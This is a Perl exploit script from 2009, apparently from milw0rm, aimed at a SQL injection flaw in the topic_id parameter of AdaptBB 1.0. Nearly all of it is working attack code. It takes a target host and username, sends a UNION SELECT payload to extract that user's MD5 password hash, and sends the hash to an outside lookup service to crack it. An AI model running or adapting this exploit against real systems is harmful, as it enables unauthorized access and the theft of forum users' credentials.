<html><head><title>AdaptBB 1.0 (topic_id) SQL Injection / Credentials Disclosure Exploit</title></head><pre>#!/usr/bin/perl -w
#
# AdaptBB 1.0 (topic_id) SQL Injection / Credentials Disclosure Exploit
# 
# Description
# -----------
# AdaptBB contains a flaw that allows an attacker to carry out an SQL 
# injection attack. The issue is due to the inc/bb/topic.php script not 
# properly sanitizing user-supplied input to the 'topic_id' variable. This may 
# allow an attacker to inject or manipulate SQL queries in the backend 
# database if magic_quotes_gpc = off.
# -----------
# by Juri Gianni aka yeat - staker[at]hotmail[dot]it


use strict;
use LWP::Simple;
use IO::Socket;


our ($host,$path,$username) = @ARGV;

if (@ARGV != 3) 
{
       print &quot;\n+-----------------------------------------------------------------------+\n&quot;.
             &quot;\r| AdaptBB 1.0 (topic_id) SQL Injection / Credentials Disclosure Exploit |\n&quot;.
             &quot;\r+-----------------------------------------------------------------------+\n&quot;.
             &quot;\rby yeat - staker[at]hotmail[dot]it\n&quot;.
             &quot;\nUsage: perl $0 host /path/ username\n&quot;.
             &quot;\nhost: localhost\n&quot;.
             &quot;\rpath: /adaptbb/\n&quot;.
             &quot;\rusername: target username\n&quot;;
       exit;
}  

if ($username =~ /(\w+)/i) {
   print &quot;Victim: $username\n&quot;;
   exploit();
}   

sub exploit
{
       my ($packet,$html,$inject,$socket);
       
       $inject = &quot;%27/**/UNION/**/SELECT/**/password,2,3,4,5,6,7,8,9,10/**/&quot;.
                 &quot;FROM/**/adaptbb_users/**/WHERE/**/username='$username'%23&quot;;
       
       $socket = new IO::Socket::INET(
                                      PeerAddr =&gt; $host,
                                      PeerPort =&gt; 80,
                                      Proto    =&gt; 'tcp',
                                    ) or die $!;
                                        
                                          
      $packet .= &quot;GET $path/index.php?do=topic&amp;topic_id=$inject\r\n&quot;;
      $packet .= &quot;Host: $host\r\n&quot;;
      $packet .= &quot;User-Agent: Lynx (textmode)\r\n&quot;;
      $packet .= &quot;Connection: close\r\n\r\n&quot;;
      
      $socket-&gt;send($packet);
      
      while (&lt;$socket&gt;) {
         $html .= $_;
      }          
      
      if ($html =~ /Re: ([a-f0-9]{32})&quot;/i) {
         print &quot;Exploit successful\nMD5: $1\n&quot;;
         print &quot;Password Cracked: &quot;.search_md5($1).&quot;\n&quot;;
      }
      else {
         print &quot;Exploit unsuccesful..\n&quot;;
      }      
}      
    

sub search_md5
{
     my $hash = shift @_;
     my $cont = undef;
     
     if ($hash =~ /^([a-f0-9]{32})$/i) {
        return get(&quot;http://md5.rednoize.com/?p&amp;s=md5&amp;q=$hash&quot;);
     }
     else {
        return 404;
     }      
}   

# milw0rm.com [2009-04-03]</pre></html>